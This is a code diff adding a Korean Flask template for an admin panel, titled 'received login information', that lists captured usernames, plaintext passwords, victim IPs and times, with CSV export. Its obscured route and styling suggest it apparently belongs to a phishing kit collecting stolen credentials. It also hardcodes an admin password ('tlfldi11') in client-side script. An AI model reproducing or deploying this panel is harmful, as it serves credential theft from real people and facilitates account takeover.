@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>관리자 페이지</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Malgun Gothic", "맑은 고딕", helvetica, "Apple SD Gothic Neo", sans-serif;
+      background-color: #f5f6f7;
+      color: #000;
+      padding: 20px;
+    }
+    h1 {
+      text-align: center;
+      font-size: 24px;
+      margin-bottom: 20px;
+      color: #03c75a;
+    }
+    .admin-container {
+      max-width: 900px;
+      margin: 0 auto;
+      background: #fff;
+      padding: 20px;
+      border: 1px solid #e5e5e5;
+      border-radius: 12px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 10px;
+      font-size: 14px;
+    }
+    th, td {
+      border: 1px solid #ddd;
+      padding: 10px;
+      text-align: center;
+    }
+    th {
+      background-color: #f8f9fa;
+      color: #333;
+    }
+    .controls {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      gap: 10px;
+      margin-bottom: 15px;
+    }
+    .controls form,
+    .controls button,
+    .controls a {
+      margin: 0;
+    }
+    .controls input,
+    .controls button,
+    .controls select {
+      padding: 8px 12px;
+      font-size: 14px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    .controls button,
+    .controls a.button {
+      background-color: #03c75a;
+      color: white;
+      text-decoration: none;
+      border: none;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+    .controls button:hover,
+    .controls a.button:hover {
+      background-color: #029e47;
+    }
+    .pagination {
+      text-align: center;
+      margin-top: 20px;
+    }
+    .pagination a,
+    .pagination span {
+      margin: 0 5px;
+      font-size: 14px;
+      color: #03c75a;
+      text-decoration: none;
+    }
+    .pagination span {
+      font-weight: bold;
+    }
+    .delete-btn {
+      margin-top: 10px;
+      display: block;
+      background: #f44336;
+      color: white;
+      border: none;
+      padding: 10px 15px;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .delete-btn:hover {
+      background: #d32f2f;
+    }
+    .pw-confirm {
+      margin-top: 10px;
+      display: flex;
+      gap: 10px;
+      align-items: center;
+    }
+    .pw-confirm input {
+      flex: 1;
+      padding: 8px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+  </style>
+</head>
+<body>
+  <div class="admin-container">
+    <h1>접수된 로그인 정보</h1>
+
+    <div class="controls">
+      <form action="{{ url_for('admin_login') }}" method="get" style="text-align:right; margin-bottom:10px;">
+        <button type="submit" style="padding:8px 16px; border:none; background-color:#ccc; border-radius:6px; font-weight:bold;">로그아웃</button>
+      </form>
+
+      <form method="get">
+        <input type="text" name="search_id" placeholder="아이디 검색" value="{{ request.args.get('search_id', '') }}">
+        <input type="text" name="search_ip" placeholder="IP 검색" value="{{ request.args.get('search_ip', '') }}">
+        <input type="date" name="search_date" value="{{ request.args.get('search_date', '') }}">
+        <button type="submit">검색</button>
+      </form>
+      <div>
+        <a href="?sort=id" class="button">아이디순 정렬</a>
+        <a href="?sort=time" class="button">시간순 정렬</a>
+      </div>
+      <div>
+        <form method="post" action="/QkdQKdadmin/delete_all" onsubmit="return confirmDelete(this)">
+          <input type="password" name="admin_pw" placeholder="관리자 비밀번호" required>
+          <button type="submit">전체 삭제</button>
+        </form>
+        <form method="get" action="/QkdQKdadmin/download">
+          <button type="submit">CSV 다운로드</button>
+        </form>
+      </div>
+    </div>
+
+    <form method="post" action="/QkdQKdadmin/delete_selected" onsubmit="return confirmDelete(this)">
+      <table>
+        <thead>
+          <tr>
+            <th><input type="checkbox" id="selectAll" onclick="toggleAll(this)"></th>
+            <th>아이디</th>
+            <th>비밀번호</th>
+            <th>IP</th>
+            <th>시간</th>
+          </tr>
+        </thead>
+        <tbody>
+          {% for row in records %}
+          <tr>
+            <td><input type="checkbox" name="delete_ids" value="{{ row.uuid }}"></td>
+            <td>{{ row.id }}</td>
+            <td>{{ row.pw }}</td>
+            <td>{{ row.ip }}</td>
+            <td>{{ row.time }}</td>
+          </tr>
+          {% endfor %}
+        </tbody>
+      </table>
+      <div class="pw-confirm">
+        <input type="password" name="admin_pw" placeholder="관리자 비밀번호" required>
+        <button type="submit" class="delete-btn">선택 삭제</button>
+      </div>
+    </form>
+
+    <div class="pagination">
+      {% for page_num in page_range %}
+        {% if page_num == current_page %}
+          <span>[{{ page_num }}]</span>
+        {% else %}
+          <a href="?page={{ page_num }}">{{ page_num }}</a>
+        {% endif %}
+      {% endfor %}
+    </div>
+  </div>
+
+  <script>
+    function toggleAll(master) {
+      const checkboxes = document.querySelectorAll('input[name="delete_ids"]');
+      checkboxes.forEach(cb => cb.checked = master.checked);
+    }
+    function confirmDelete(form) {
+      const pw = form.querySelector('input[name="admin_pw"]').value;
+      if (!pw) {
+        alert('비밀번호를 입력하세요.');
+        return false;
+      }
+      if (pw !== 'tlfldi11') {
+        alert('비밀번호가 틀렸습니다.');
+        return false;
+      }
+      return confirm('정말 삭제하시겠습니까?');
+    }
+  </script>
+</body>
+</html>
